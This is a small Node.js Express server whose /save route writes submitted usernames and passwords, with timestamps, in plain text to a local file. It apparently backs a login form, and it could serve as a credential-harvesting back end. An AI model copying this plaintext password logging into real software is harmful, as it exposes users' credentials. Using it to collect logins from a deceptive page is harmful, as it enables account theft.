const express = require('express');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;
const path = require('path');

// Middleware to parse URL-encoded data (from forms)
app.use(express.urlencoded({ extended: true }));

// Serve your static files (index.html, style.css, etc.) from the project folder
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// POST route to save username and Password
app.post('/save', (req, res) => {
  const username = req.body.username;
  const Password = req.body.Password;
  const time = new Date().toLocaleString();

  const data = `Username: ${username} | Password: ${Password} | Time: ${time}\n`;

  fs.appendFile('usernames.txt', data, (err) => {
    if (err) {
     res.status(500).send("Error saving data");
    } else {
      res.send("Saved successfully");
    }
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
